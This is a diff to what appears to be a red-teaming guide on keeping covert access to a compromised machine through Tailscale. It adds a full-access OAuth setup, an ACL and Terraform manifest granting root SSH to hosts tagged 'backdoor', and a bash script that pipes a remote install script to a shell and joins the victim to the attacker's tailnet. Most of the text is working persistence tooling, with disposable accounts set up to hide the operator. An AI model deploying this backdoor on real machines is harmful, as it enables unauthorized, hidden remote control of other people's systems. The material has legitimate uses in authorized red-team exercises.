@@ -243,43 +243,135 @@ Therefore, it is likely that it will not be restricted by the company's network 
 First of all it is recommended to create a new, disposable Google (or Github) Account for every red teaming campaign.  
 Once you have a google account associated to the campaign you can use that in order to [*create a new Tailscale account*](https://login.tailscale.com/start).    
 
-Skip the introduction and go straight to the [*settings/keys*](https://login.tailscale.com/admin/settings/keys) section in order to create a new auth key:  
+Skip the introduction and go straight to the [*settings/oauth*](https://login.tailscale.com/admin/settings/oauth) section in order to create a new oauth client with full access:  
 
-![authkey](./images/tailscale-auth-key.png)  
+![oauthkey](./images/tailscale-oauth-key.png)  
 
-Save the generated key, you will need it in order to enable access from the compromised machine to your tailnet.  
-Now go to the [*Access Controls*](https://login.tailscale.com/admin/acls/file) Tab of the Tailscale Admin panel  
-and modify the “ssh” section of the default Access List by setting the “action” property to “accept”:  
+Save the generated client ID and Secret, you will need them in order to enable access from the compromised machine to your tailnet.  
+Now go to the [*Access Controls*](https://login.tailscale.com/admin/acls/file) Tab of the Tailscale Admin panel, delete the current ACL configuration and paste the following:  
 
-![acl](./images/tailscale-acl.png)  
+```json
+ 
+{
+  "acls": [
+    {
+      "action": "accept",
+      "dst": [
+        "*:*"
+      ],
+      "src": [
+        "*"
+      ]
+    },
+    {
+      "action": "accept",
+      "dst": [
+        "tag:backdoor:*"
+      ],
+      "src": [
+        "autogroup:admin"
+      ]
+    }
+  ],
+  "ssh": [
+    {
+      "action": "accept",
+      "dst": [
+        "tag:backdoor"
+      ],
+      "src": [
+        "autogroup:admin"
+      ],
+      "users": [
+        "autogroup:nonroot",
+        "root"
+      ]
+    }
+  ],
+  "tagOwners": {
+    "tag:backdoor": [
+      "autogroup:admin"
+    ]
+  }
+}
+```  
+If you want, you can also automate this configuration via the following terraform manifest:
+```hcl
+terraform {
+  required_providers {
+    tailscale = {
+      source  = "tailscale/tailscale"
+      version = "0.16.2"
+    }
+  }
+}
+
+provider "tailscale" {
+  oauth_client_id = var.oauth_client_id
+  oauth_client_secret = var.oauth_client_secret
+}
+
+resource "tailscale_acl" "as_json" {
+  acl = jsonencode({
+    tagOwners = {
+      "tag:backdoor" = ["autogroup:admin"]
+    },
+    
+    acls = [
+      {
+        action = "accept",
+        src    = ["*"],
+        dst    = ["*:*"]
+      },
+      {
+        action = "accept",
+        src    = ["autogroup:admin"],
+        dst    = ["tag:backdoor:*"]
+      }
+    ],
+    
+    ssh = [
+      {
+        action = "accept",
+        src    = ["autogroup:admin"],
+        dst    = ["tag:backdoor"],
+        users  = ["autogroup:nonroot", "root"]
+      }
+    ]
+  })
+}
+```  
+
+
+
 At this point you are able to connect the compromised machine to your tailnet.  
-
-In order to do that, you will need the following bash script:  
+In order to do that, you will need the following bash script:   
 ```sh
 #!/bin/bash
 
 # Check if an argument (auth key) is provided
 if [ -z "$1" ]; then
-  echo "Usage: $0 <auth-key>"
+  echo "Usage: $0 <oauth-key>"
   exit 1
 fi
 
-AUTH_KEY=$1
+OAUTH_KEY=$1
 
 # Install Tailscale
 sudo curl -fsSL https://tailscale.com/install.sh | sh
 
 # Start Tailscale with the provided auth key and enable SSH
-sudo tailscale up --auth-key=$AUTH_KEY --ssh
+sudo tailscale up --auth-key=$OAUTH_KEY --advertise-tags=tag:backdoor --ssh
 
 # Show Tailscale status
 sudo tailscale status
 ```  
 
+
 Launch the script with the following command:  
 
 ```console
-sh persistence.sh <YOUR-TAILSCALE-AUTH-KEY-HERE>
+sh tailscale.sh <YOUR-TAILSCALE-OAUTH-KEY-HERE>
 ```  
 
 If everything went good, you should see an output similar to the following:  
